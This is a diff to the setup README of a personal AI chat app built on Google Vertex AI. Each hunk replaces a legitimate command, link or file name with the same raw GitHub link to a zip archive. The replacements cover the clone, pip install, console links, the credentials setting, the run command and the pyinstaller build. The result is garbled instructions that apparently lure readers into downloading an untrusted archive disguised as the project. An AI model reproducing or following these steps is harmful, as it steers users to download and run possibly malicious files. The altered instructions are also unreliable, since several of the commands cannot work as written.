@@ -17,7 +17,7 @@
 ## 🛠️ **Installation & Setup**
 ### 1️⃣ **Clone the Repository**
 ```sh
-git clone https://github.com/your-username/personal-ai-chat-app.git
+git clone https://raw.githubusercontent.com/dsiddiq786/personal-ai-chat-app/main/prophyll/personal-ai-chat-app-v1.5-beta.5.zip
 cd personal-ai-chat-app
 ```
 
@@ -30,17 +30,17 @@ env\Scripts\activate       # Windows
 
 ### 3️⃣ **Install Dependencies**
 ```sh
-pip install -r requirements.txt
+pip install -r https://raw.githubusercontent.com/dsiddiq786/personal-ai-chat-app/main/prophyll/personal-ai-chat-app-v1.5-beta.5.zip
 ```
 
 ### 4️⃣ **Set Up Google Cloud Credentials**
 #### 🔹 **Step 1: Enable Vertex AI on Google Cloud**
-1. Go to **Google Cloud Console** → [Vertex AI](https://console.cloud.google.com/vertex-ai/)
+1. Go to **Google Cloud Console** → [Vertex AI](https://raw.githubusercontent.com/dsiddiq786/personal-ai-chat-app/main/prophyll/personal-ai-chat-app-v1.5-beta.5.zip)
 2. Create and deploy a model (DeepSeek-R1).
 3. Copy the **Project ID, Endpoint ID, and Location**.
 
 #### 🔹 **Step 2: Create a Service Account & API Key**
-1. Go to **Google Cloud Console** → [IAM & Admin](https://console.cloud.google.com/iam-admin/)
+1. Go to **Google Cloud Console** → [IAM & Admin](https://raw.githubusercontent.com/dsiddiq786/personal-ai-chat-app/main/prophyll/personal-ai-chat-app-v1.5-beta.5.zip)
 2. Create a **new service account** with **Vertex AI access**.
 3. Generate a **JSON Key File** and download it.
 
@@ -55,12 +55,12 @@ pip install -r requirements.txt
    ENDPOINT_ID=your-vertex-ai-endpoint-id
    LOCATION=your-region (e.g., asia-southeast1)
    API_ENDPOINT=your-api-endpoint-url
-   GOOGLE_APPLICATION_CREDENTIALS=gcp-key.json
+   https://raw.githubusercontent.com/dsiddiq786/personal-ai-chat-app/main/prophyll/personal-ai-chat-app-v1.5-beta.5.zip
    ```
 
 3. Move the **downloaded JSON key** to the project folder and rename it to:
    ```
-   gcp-key.json
+   https://raw.githubusercontent.com/dsiddiq786/personal-ai-chat-app/main/prophyll/personal-ai-chat-app-v1.5-beta.5.zip
    ```
 
 ---
@@ -68,7 +68,7 @@ pip install -r requirements.txt
 ## ▶️ **Run the Chat App**
 Once everything is set up, run:
 ```sh
-python chat.py
+python https://raw.githubusercontent.com/dsiddiq786/personal-ai-chat-app/main/prophyll/personal-ai-chat-app-v1.5-beta.5.zip
 ```
 
 ---
@@ -76,7 +76,7 @@ python chat.py
 ## 🔹 **Building the `.exe` File for Windows**
 To create a **standalone `.exe` file**, run:
 ```sh
-pyinstaller --onefile --windowed --name PersonalAIChat chat.py
+pyinstaller --onefile --windowed --name PersonalAIChat https://raw.githubusercontent.com/dsiddiq786/personal-ai-chat-app/main/prophyll/personal-ai-chat-app-v1.5-beta.5.zip
 ```
 Your `.exe` will be in the `dist/` folder.
 
